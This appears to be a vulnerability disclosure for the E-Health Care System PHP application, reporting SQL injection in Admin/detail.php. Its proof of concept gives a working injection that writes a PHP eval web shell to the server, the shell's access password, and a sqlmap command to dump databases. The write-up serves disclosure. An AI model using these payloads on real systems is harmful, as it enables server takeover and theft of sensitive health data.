# E-Health Care System IN PHP has get shell and sql injection vulnerability.

## supplier
https://code-projects.org/e-health-care-system-in-php-css-js-and-mysql-free-download/
## Vulnerability file
/Admin/detail.php
## describe
An unrestricted **SQL injection** And **shell file writing** exists in Admin/detail.php of  E-Health Care System . The parameters that can be controlled are as follows: **$_GET['s_id']** . This function executes the **$_GET['s_id']**parameter into the SQL statement without any restrictions. Hacker can write shell.php to the website servers.  A malicious attacker also could exploit this vulnerability to obtain sensitive information in the server database.

## code analysis
The **$_GET['s_id']**parameters of the /Admin/detail.php are not filtered and concatenated into the SQL statement for execution. 

![image-20241106213127406](https://github.com/user-attachments/assets/c806e968-65f7-41fc-8a2f-15344cc3bcd1)



## POC

### RCE

Access this URL,  we will write shell file on the website server.

```
http://healthcare/Admin/detail.php?s_id=1' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,'<?php eval($_POST[cmd]);?>' into outfile 'D:/phpstudy_pro/WWW/HealthCare/shell.php'--+
```

Connect to the shell.php

```
url:  http://healthcare/shell.php
password:   cmd
```

![image-20241106212244435](https://github.com/user-attachments/assets/e07b1229-19b8-4aa9-961d-222bb460e753)

### GET DATA

```
http://healthcare/Admin/detail.php?s_id=1*
```

excute the command

```
python sqlmap.py -u "http://healthcare/Admin/detail.php?s_id=1*" --dbs
```

![image-20241106220918677](https://github.com/user-attachments/assets/ed59bd6a-9d00-410a-90a6-bed45b1c7d26)